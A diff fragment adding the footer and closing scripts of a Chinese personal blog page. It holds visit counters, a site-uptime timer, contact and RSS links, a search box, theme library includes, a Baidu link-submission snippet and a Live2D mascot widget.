+            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                class="white-color">177.2k</span>&nbsp;字
+            
+            
+            
+            
+            
+            
+            <span id="busuanzi_container_site_pv">
+                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;次
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;人
+            </span>
+            
+            <br>
+            
+            <span id="sitetime">载入运行时间...</span>
+            <script>
+                function siteTime() {
+                    window.setTimeout("siteTime()", 1000);
+                    var seconds = 1000;
+                    var minutes = seconds * 60;
+                    var hours = minutes * 60;
+                    var days = hours * 24;
+                    var years = days * 365;
+                    var today = new Date();
+                    var startYear = "2019";
+                    var startMonth = "6";
+                    var startDate = "28";
+                    var startHour = "0";
+                    var startMinute = "0";
+                    var startSecond = "0";
+                    var todayYear = today.getFullYear();
+                    var todayMonth = today.getMonth() + 1;
+                    var todayDate = today.getDate();
+                    var todayHour = today.getHours();
+                    var todayMinute = today.getMinutes();
+                    var todaySecond = today.getSeconds();
+                    var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
+                    var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
+                    var diff = t2 - t1;
+                    var diffYears = Math.floor(diff / years);
+                    var diffDays = Math.floor((diff / days) - diffYears * 365);
+                    var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
+                    var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) /
+                        minutes);
+                    var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours -
+                        diffMinutes * minutes) / seconds);
+                    if (startYear == todayYear) {
+                        document.getElementById("year").innerHTML = todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffDays + " 天 " + diffHours +
+                            " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    } else {
+                        document.getElementById("year").innerHTML = startYear + " - " + todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffYears + " 年 " + diffDays +
+                            " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    }
+                }
+                setInterval(siteTime, 1000);
+            </script>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/Kit4y" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:381382770@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=381382770" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 381382770" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+$(function () {
+    searchFunc("/" + "search.xml", 'searchInput', 'searchResult');
+});
+</script>
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+    <script type="text/javascript" src="/libs/background/ribbon-dynamic.js" async="async"></script>
+    
+    
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/miku.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false});</script></body>
+
+</html>
